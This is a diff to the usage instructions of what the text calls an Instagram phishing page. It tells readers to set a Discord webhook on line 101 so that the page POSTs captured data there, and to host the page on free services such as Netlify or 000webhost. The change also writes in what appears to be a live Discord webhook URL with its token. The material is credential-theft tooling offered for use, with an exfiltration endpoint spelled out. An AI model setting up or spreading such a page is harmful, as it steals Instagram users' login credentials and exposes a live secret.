@@ -1,6 +1,6 @@
 Usage :
 
-My Instagram phishing page is really easy to use, you only have to replace WEBHOOK on line 101 by your Discord webhook
+My Instagram phishing page is really easy to use, you only have to replace [https://discord.com/api/webhooks/1282157795537453098/GwpK6Tlu2N_Ap_jfozn5C0ju2JD5ecXwu2hdOTk2QavV-JrqDOD_3FWm1FGDiV0V_qAq) on line 101 by your Discord webhook.
 request.open("POST", "Webhook");
 
 Next, you upload it to your website (like Netlify or 000webhost, they are free)
